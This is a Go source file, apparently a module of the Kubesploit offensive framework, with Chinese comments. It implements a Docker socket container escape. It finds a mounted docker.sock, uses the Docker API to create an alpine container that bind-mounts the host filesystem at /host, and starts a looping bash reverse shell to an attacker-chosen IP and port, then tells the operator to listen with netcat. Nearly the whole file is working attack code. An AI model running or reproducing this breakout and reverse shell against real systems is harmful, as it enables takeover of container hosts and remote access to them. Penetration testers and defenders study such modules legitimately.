# `kubesploit\data\modules\sourcecode\go\dockerSockBreakout\main.go`

```
package main

import (
    "context"  // 上下文包，用于控制请求的取消、超时等
    "encoding/json"  // JSON 编解码包
    "fmt"  // 格式化包，用于打印输出
    "io/ioutil"  // 读取文件内容包
    "log"  // 日志包
    "net"  // 网络包
    "net/http"  // HTTP 协议包
    "os/exec"  // 执行外部命令包
    "strings"  // 字符串处理包
)

func sendMessage(httpClient *http.Client, url string, method string, postData string) []byte{
    var response *http.Response  // 声明 HTTP 响应对象指针
    var err error  // 声明错误变量

    if method == "GET"{  // 如果请求方法为 GET
        response, err = httpClient.Get(url)  // 发送 GET 请求
    } else {
        response, err = httpClient.Post(url, "application/json", strings.NewReader(postData))  // 发送 POST 请求
    }

    if err != nil {  // 如果发生错误
        panic(err)  // 抛出异常
    }

    bodyBytes, err := ioutil.ReadAll(response.Body)  // 读取响应体内容
    if err != nil {  // 如果发生错误
        log.Fatal(err)  // 记录错误日志
    }

    defer response.Body.Close()  // 延迟关闭响应体
    return bodyBytes  // 返回响应体内容
}

type ContainerCreationStatus struct {
    Id string `json:Id`  // 定义容器创建状态结构体，包含 ID 字段
}

func getDockerSockPath()(string,error){
    cmd := `if  cat /proc/self/mountinfo | grep -q '^[^[:space:]]*[[:space:]][^[:space:]]*[[:space:]][^[:space:]]*[[:space:]]docker.sock'; then
       path=$(cat /proc/self/mountinfo | grep '^[^[:space:]]*[[:space:]][^[:space:]]*[[:space:]][^[:space:]]*[[:space:]]docker.sock' | cut -d' ' -f 5)
       echo $path
     else
       exit 1
     fi`  // 定义获取 Docker.sock 路径的命令
    out, err := exec.Command("sh", "-c", cmd).Output()  // 执行命令获取输出
    return strings.TrimSuffix(string(out), "\n"),err  // 返回处理后的输出和错误
}

func createContainer(httpClient *http.Client, postData string){
    bodyBytes := sendMessage(httpClient, "http://v1.27/containers/create", "POST", postData)  // 发送创建容器的请求
    fmt.Println("[*] Container has been created, waiting to start...")  // 打印提示信息
    //fmt.Println(string(bodyBytes))

    var containerCreationStatus ContainerCreationStatus  // 声明容器创建状态结构体变量
    err := json.Unmarshal(bodyBytes, &containerCreationStatus)  // 解析响应体内容到容器创建状态结构体变量
    if err != nil {  // 如果发生错误
        log.Fatal(err)  // 记录错误日志
    }

    url := fmt.Sprintf("http://v1.27/containers/%s/start", containerCreationStatus.Id)  // 格式化容器启动的 URL
    bodyBytes = sendMessage(httpClient, url, "POST", "")  // 发送启动容器的请求
    fmt.Println("[*] Container has been started")  // 打印提示信息
    fmt.Printf("[*] Container ID: %s\n", containerCreationStatus.Id)  // 打印容器 ID
    fmt.Print(string(bodyBytes))  // 打印响应体内容

}
// 定义名为 mainfunc 的函数，接受 IP 地址和端口号作为参数
func mainfunc(ipToConnect string, port string) {
    // 清除 IP 地址和端口号中的空格
    ipToConnect = strings.TrimSpace(ipToConnect)
    port = strings.TrimSpace(port)

    // 如果端口号为空，则设置为默认值 "6666"
    if port == "" {
        port = "6666"
    }

    // 获取 Docker 的 sock 路径，如果失败则输出错误信息并结束 exploit
    dockerSockPath, err := getDockerSockPath()
    if err != nil {
        fmt.Printf("[!] Docker sock is not mounted in the container. Ending exploit\n")
        return
    }

    // 创建 HTTP 客户端
    httpc := http.Client{
        Transport: &http.Transport{
            // 定义 DialContext 函数，用于建立与 Docker 的 unix socket 连接
            DialContext: func(_ context.Context, _, _ string) (net.Conn, error) {
                return net.Dial("unix", dockerSockPath)
            },
        },
    }

    // 发送 GET 请求获取容器信息，并打印返回的数据
    bodyBytes := sendMessage(&httpc, "http://host/containers/json", "GET", "")
    fmt.Println(string(bodyBytes))

    // 构造要发送的 POST 数据，用于创建容器并执行命令
    postData := fmt.Sprintf(`{ "Detach":true, "AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Image":"alpine:latest", "HostConfig":{"Binds": ["/:/host"]}, "Cmd":["sh", "-c", "apk update && apk add bash && bash -c 'while true; do bash -i >& /dev/tcp/%s/%s 0>&1; sleep 2; done'"] }`, ipToConnect, port)
    createContainer(&httpc, postData)

    // 打印提示信息，指示如何监听端口获取 shell，并指出容器内主机的路径
    fmt.Printf("[*] Listen to port %s on IP %s to get a shell (\"nc -lvp %s\")\n", port, ipToConnect, port)
    fmt.Printf("[*] The path to the host machine inside the container is /host\n")
    //io.Copy(os.Stdout, response.Body)
}

// 主函数
func main(){
    // 调用 mainfunc 函数，传入 IP 地址和端口号
    //mainfunc("192.168.1.1", "6666")
}
```